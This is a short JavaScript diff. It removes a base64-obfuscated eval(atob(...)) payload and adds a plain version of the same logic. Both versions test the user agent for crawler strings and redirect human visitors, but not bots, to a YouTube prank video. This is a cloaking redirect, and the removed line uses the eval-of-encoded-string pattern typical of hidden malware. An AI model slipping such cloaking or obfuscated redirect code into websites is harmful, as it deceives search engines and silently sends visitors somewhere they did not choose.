@@ -1,1 +1,6 @@
-eval(atob('KGZ1bmN0aW9uKCkgewogICAgY29uc29sZS5sb2coIlBBWUxPQURFWEVDVVRFRCIpOwogICAgY29uc3QgaXNCb3QgPSAvYm90fGdvb2dsZWJvdHxjcmF3bGVyfHNwaWRlcnxyb2JvdHxjcmF3bGluZy9pLnRlc3QobmF2aWdhdG9yLnVzZXJBZ2VudCk7CiAgICBpZiAoaXNCb3QpIHsKICAgICAgICBjb25zb2xlLmxvZygiQk9UIERFVEVDVEVEIC0gU2hvd2luZyBzYWZlIGNvbnRlbnQuIik7CiAgICB9IGVsc2UgewogICAgICAgIGNvbnNvbGUubG9nKCJIVU1BTiBERVRFQ1RFRCAtIFJlZGlyZWN0aW5nIHRvIFlvdVR1YmUuLi4iKTsKICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9ICJodHRwczovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PWRRdTR3OVdnWGNRIjsKICAgIH0KfSkoKTs='));
+var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
+if (isBot) {
+    console.log("BOT DETECTED");
+} else {
+    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+}
